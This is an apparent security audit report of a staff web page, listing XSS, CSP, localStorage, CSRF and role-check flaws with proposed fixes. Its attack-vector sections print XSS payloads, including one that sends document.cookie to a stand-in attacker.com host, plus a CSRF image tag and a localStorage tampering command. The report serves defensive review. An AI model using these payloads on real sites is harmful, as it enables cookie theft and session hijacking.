# Security Audit: staff.html

**Date:** October 21, 2025  
**Status:** CRITICAL ISSUES FOUND  
**Severity:** HIGH

---

## 🚨 CRITICAL SECURITY ISSUES

### 1. **XSS Vulnerability - innerHTML with User-Controlled Data** 🔴 CRITICAL
**Location:** Lines 3377-3400 (Activity Feed Rendering)  
**Severity:** CRITICAL - Remote Code Execution Possible  
**Risk:** Stored/Reflected XSS

```javascript
feedEl.innerHTML = recentActivities.map(activity => {
  const avatarContent = (avatarsAllowed && activity.avatar)
    ? `<img src="${activity.avatar}" alt="" data-user-id="${activity.userId || ''}">`
    : activity.icon;
  return `
    <div class="activity-item ${activity.type}" data-user-id="${activity.userId || ''}">
      <div class="activity-avatar">${avatarContent}</div>
      ...
      <div class="activity-title">${activity.title}...</div>
      <div class="activity-detail">${activity.detail}</div>
      ...
    </div>
  `;
}).join('');
```

**Vulnerability:** 
- `activity.title` and `activity.detail` are inserted directly via template strings
- `activity.icon` is inserted as raw HTML (could contain `<script>` tags)
- `activity.avatar` URL not validated (could be javascript: protocol)
- No HTML escaping performed

**Attack Vector:**
```javascript
// Attacker could inject:
activity.title = '<img src=x onerror="fetch(attacker.com?cookie=' + document.cookie + ')">'
activity.detail = '<svg onload="alert(1)">'
activity.icon = '<script>alert("XSS")</script>'
activity.avatar = 'javascript:alert(1)'
```

**Impact:** Cookie theft, session hijacking, credential harvesting, malware distribution

**Fix:** Use `textContent` instead of `innerHTML` or sanitize with DOMPurify
```javascript
// SAFE Alternative:
const div = document.createElement('div');
div.className = `activity-item ${activity.type}`;
div.setAttribute('data-activity-type', activity.type);
div.innerHTML = `<div class="activity-avatar"></div>...`;
// Then use textContent for user data:
div.querySelector('.activity-title').textContent = activity.title;
div.querySelector('.activity-detail').textContent = activity.detail;
```

---

### 2. **innerHTML with Avatar URLs** 🔴 CRITICAL
**Location:** Lines 2107, 2094  
**Severity:** HIGH - URL Injection  

```javascript
// Line 2107 - navbar avatar
navbarAvatar.innerHTML = `<img src="${avatarUrl}" alt="${displayName}" ...>`;

// Line 2094 - initial avatar
container.innerHTML = `<div style="...>${initial}</div>`;
```

**Vulnerability:**
- `displayName` could contain HTML/script tags if from untrusted source
- `avatarUrl` not validated for javascript: or data: URLs
- Initial character `${initial}` not escaped

**Fix:**
```javascript
navbarAvatar.innerHTML = '';
const img = document.createElement('img');
img.src = avatarUrl;  // Browser auto-validates src
img.alt = displayName;  // Always safe with textContent
navbarAvatar.appendChild(img);
```

---

### 3. **CSP Policy Too Permissive** 🔴 CRITICAL
**Location:** Line 9  
**Severity:** CRITICAL - Defeats Security  

```html
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; 
           script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.supabase.co ...">
```

**Issues:**
- `'unsafe-inline'` allows all inline scripts (XSS vectors)
- `'unsafe-eval'` allows `eval()` execution
- `https://*.supabase.co` wildcard is too broad (*.supabase.co could be attacker-controlled subdomain)
- No `nonce` or `hash` for inline scripts
- Inline styles with `'unsafe-inline'` in style-src

**Current Protections:** NONE - CSP is effectively disabled

**Impact:** XSS exploits are fully possible

**Fix - Strict CSP:**
```html
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self'; 
           script-src 'self' https://supabase.com https://fonts.googleapis.com;
           style-src 'self' https://fonts.googleapis.com;
           img-src 'self' blob: https:;
           connect-src 'self' https://api.supabase.com wss://api.supabase.com;
           font-src 'self' https://fonts.gstatic.com;
           object-src 'none';
           frame-ancestors 'none';">
```

---

### 4. **localStorage Misuse - Site ID Fallback** 🟠 HIGH
**Location:** Line 2595  
**Severity:** HIGH - Data Leakage/Tampering  

```javascript
siteSettings = await getSiteSettings(supabase, 
  profileRow?.site_id || localStorage.getItem('site_id'));
```

**Vulnerability:**
- Trusts user-editable localStorage as fallback
- Attacker can set localStorage.site_id to any value
- Could load settings from wrong site or attacker-controlled site
- No validation that user has access to site_id

**Attack Vector:**
```javascript
// In console, attacker runs:
localStorage.setItem('site_id', attacker_site_id);
// Now they can see another site's data if RLS is weak
```

**Fix:**
```javascript
// Only use server-validated site_id
siteSettings = await getSiteSettings(supabase, profileRow?.site_id);
// If profileRow.site_id is missing, redirect (user shouldn't be there)
if (!profileRow?.site_id) {
  window.location.href = '/home.html';
  return;
}
```

---

### 5. **Greeting Shuffler - localStorage Data Injection** 🟠 HIGH
**Location:** Lines 3493-3500  
**Severity:** MEDIUM - Session Fixation/Tracking  

```javascript
let last = parseInt(localStorage.getItem(storageKey), 10);
// ...
try { localStorage.setItem(storageKey, String(idx)); } catch (e) { /* ignore */ }
```

**Vulnerability:**
- Stores user state in cleartext localStorage
- Could be used for session fixation attacks
- User ID embedded in storage key (privacy concern)
- No encryption/signing

**Risk:**
- Greeting index could be manipulated to track users
- Storage key exposes `checkloops_greeting_idx_v1_<userId>` - user ID exposed

**Fix:**
```javascript
// Use sessionStorage instead (cleared on tab close):
let last = parseInt(sessionStorage.getItem(storageKey), 10);
sessionStorage.setItem(storageKey, String(idx));

// Or better: never store user tracking info client-side
// Move to server-side if tracking needed
```

---

### 6. **Missing Input Validation on Avatar URLs** 🟠 HIGH
**Location:** Lines 2107, 3384  
**Severity:** MEDIUM - Protocol Injection  

```javascript
// No validation:
const img = document.createElement('img');
img.src = avatarUrl;  // Could be javascript:, data:, about:

// Activity feed:
`<img src="${activity.avatar}" ...>`  // Same issue
```

**Attack Vector:**
```javascript
img.src = "javascript:alert('XSS')";
// Browser will execute on click

img.src = "data:text/html,<script>alert(1)</script>";
// Could execute in some contexts
```

**Fix:**
```javascript
function isValidImageUrl(url) {
  if (!url) return false;
  try {
    const parsed = new URL(url);
    return /^https?:$/.test(parsed.protocol);  // Only http/https
  } catch {
    return false;
  }
}

if (isValidImageUrl(avatarUrl)) {
  img.src = avatarUrl;
} else {
  // Fallback to initials
  renderInitialAvatar(container, initial);
}
```

---

### 7. **Inadequate Error Handling - Console Exposure** 🟡 MEDIUM
**Location:** Throughout (many console.error, console.log)  
**Severity:** LOW-MEDIUM - Information Disclosure  

```javascript
console.error(e);
console.log('Activity likes system initialized:', success);
```

**Risk:**
- Error messages could expose database schema, API paths
- Users in browser console could see sensitive operation details
- Stack traces reveal code structure

**Fix:**
```javascript
// Production: Suppress console output
if (!window.DEBUG_MODE) {
  console.log = console.error = console.warn = () => {};
}

// Or: Send errors to error tracking service
if (error instanceof Error) {
  // Send to Sentry, LogRocket, etc.
  captureException(error, { contexts: { page: 'staff' } });
}
```

---

### 8. **Missing CSRF Protection for State-Changing Operations** 🟡 MEDIUM
**Location:** Avatar mood changes (Line 2461+), data mutations  
**Severity:** MEDIUM - CSRF Attack Possible  

```javascript
async function applyAvatarMood(variantKey) {
  // Updates database but:
  // - No CSRF token verification
  // - No SameSite cookie check visible
  // - Relies only on auth token
}
```

**Attack Vector:**
```html
<!-- Attacker website embeds: -->
<img src="https://yourapp.com/api/change-mood?mood=angry&user=target" />
<!-- If user is logged in, request succeeds without CSRF token -->
```

**Fix - Ensure Server-Side:**
```javascript
// Server must verify:
// 1. SameSite=Strict on cookies
// 2. CSRF tokens in mutations (POST/PUT/DELETE)
// 3. Origin/Referer headers match
```

---

### 9. **Race Conditions in Avatar Menu** 🟡 MEDIUM
**Location:** Lines 2473-2563 (applyAvatarMood)  
**Severity:** MEDIUM - Data Corruption  

```javascript
let avatarMenuBusy = false;  // Simple flag, not atomic

async function applyAvatarMood(variantKey) {
  // Could have race condition:
  // 1. User clicks mood A (sets avatarMenuBusy = true, starts request)
  // 2. User clicks mood B (avatarMenuBusy = true, but request A still pending)
  // 3. Both requests complete out of order → inconsistent state
}
```

**Fix:**
```javascript
async function applyAvatarMood(variantKey) {
  if (avatarMenuBusy) return;  // Add explicit return
  avatarMenuBusy = true;
  
  try {
    // ... mutation
  } finally {
    avatarMenuBusy = false;
  }
}
```

---

### 10. **User Role Check Not Validating Server-Side** 🟡 MEDIUM
**Location:** Line 2623  
**Severity:** MEDIUM - Admin Bypass Possible  

```javascript
const adminRole = (profileRow?.access_type || profileRow?.role || 
                   session.user?.raw_user_meta_data?.role || '').toLowerCase();
const adminPortalBtn = document.getElementById('adminPortalBtn');
if (adminPortalBtn) {
  if (adminRole === 'admin' || adminRole === 'owner') {
    adminPortalBtn.style.display = 'flex';
  }
}
```

**Vulnerability:**
- Only hides button, doesn't prevent access
- `session.user?.raw_user_meta_data?.role` is client-editable in some scenarios
- Attacker can modify DOM or localStorage to show button
- Server must validate before granting access

**Fix:**
```javascript
// Client-side: Display hint only
// Server-side: On admin-dashboard.html page load:
const { data, error } = await supabase.rpc('verify_admin_access', {});
if (error || !data.is_admin) {
  window.location.href = '/home.html';
}
```

---

### 11. **Logging Sensitive Data** 🟡 MEDIUM
**Location:** Line 2141, 2328, and logging throughout  
**Severity:** LOW-MEDIUM - Information Disclosure  

```javascript
console.log('First heart has click handler:', hearts[0]._clickHandler ? 'YES' : 'NO');
console.log('Avatar likes system initialized:', success);
```

**Risk:**
- Console logs visible in browser DevTools (insecure if shared)
- Could leak user tracking data, internal state
- Performance metrics expose server timing

**Fix:**
```javascript
// Only log in development
if (window.location.hostname === 'localhost') {
  console.log('Debug info:', debugInfo);
}
```

---

### 12. **Missing Validation on Data from Supabase** 🟡 MEDIUM
**Location:** Multiple query results  
**Severity:** MEDIUM - Type Confusion/Injection  

```javascript
// No type checking on returned data:
const recentActivities = data || [];
recentActivities.forEach(activity => {
  // Assume activity.title, activity.detail exist
  // But if Supabase query schema changes, could crash or expose data
});
```

**Fix:**
```javascript
function validateActivity(activity) {
  return {
    title: String(activity?.title || 'Unknown').substring(0, 200),
    detail: String(activity?.detail || '').substring(0, 500),
    timestamp: new Date(activity?.timestamp || Date.now()),
    type: ['quiz', 'training', 'holiday', 'team'].includes(activity?.type) 
      ? activity.type 
      : 'unknown'
  };
}

const recentActivities = (data || [])
  .filter(a => a)
  .map(validateActivity);
```

---

## 🟢 POSITIVE SECURITY MEASURES FOUND

✅ **RLS Filters in Queries:** `.eq('user_id', userId)` properly used  
✅ **Auth State Validation:** `requireStaffSession()` enforces auth  
✅ **Secure Avatar Handling:** Image `onerror` callback for fallback  
✅ **HTTPS Enforced:** All Supabase connections over HTTPS  
✅ **Session Tokens:** Relying on Supabase JWT (good)  
✅ **No Hardcoded Secrets:** API keys loaded from config.js  

---

## 📋 REMEDIATION PRIORITY

### P0 - Fix Immediately (Today)
1. **XSS in activity feed** - Use textContent or sanitize
2. **CSP too permissive** - Tighten CSP policy
3. **Avatar URL validation** - Block javascript: protocols

### P1 - Fix This Week
4. **localStorage misuse** - Remove site_id fallback
5. **Admin role bypass** - Add server-side verification
6. **innerHTML with user data** - Replace with createElement

### P2 - Fix Soon
7. **Error handling** - Remove sensitive console logs
8. **Input validation** - Validate all external data
9. **CSRF protection** - Verify server implements SameSite

### P3 - Nice to Have
10. **Race conditions** - Add loading states
11. **Session storage** - Use sessionStorage instead
12. **Type validation** - Add runtime schema validation

---

## 🔐 RECOMMENDED IMPROVEMENTS

### Implement Input Sanitization
```javascript
// Add library like DOMPurify
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>

// Then sanitize user content:
const clean = DOMPurify.sanitize(activity.title, {ALLOWED_TAGS: []});
```

### Add Rate Limiting
```javascript
const rateLimiter = new Map();
function checkRateLimit(key, maxRequests = 10, windowMs = 1000) {
  const now = Date.now();
  if (!rateLimiter.has(key)) rateLimiter.set(key, []);
  const requests = rateLimiter.get(key)
    .filter(t => now - t < windowMs);
  if (requests.length >= maxRequests) return false;
  requests.push(now);
  rateLimiter.set(key, requests);
  return true;
}
```

### Implement Subresource Integrity (SRI)
```html
<script src="https://cdn.example.com/lib.js" 
  integrity="sha384-ABC123..." crossorigin="anonymous"></script>
```

### Add Security Headers (Server-Side)
```
Content-Security-Policy: default-src 'self'; ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

## ✅ SECURITY CHECKLIST

- [ ] Replace `innerHTML` with `textContent` for user data
- [ ] Implement strict CSP policy
- [ ] Validate all avatar URLs (http/https only)
- [ ] Remove localStorage.site_id fallback
- [ ] Add server-side admin verification
- [ ] Sanitize activity feed content
- [ ] Remove sensitive console.log statements
- [ ] Add input validation for all database results
- [ ] Implement rate limiting on mutations
- [ ] Add integrity checks to external scripts
- [ ] Verify SameSite cookie policy on server
- [ ] Test CSRF protections
- [ ] Run OWASP ZAP or similar scanner
- [ ] Add security headers (server-side)

---

**Next Steps:**
1. Address P0 issues immediately
2. Have security review of backend/RLS rules
3. Add automated security scanning to CI/CD
4. Consider security audit by professional firm
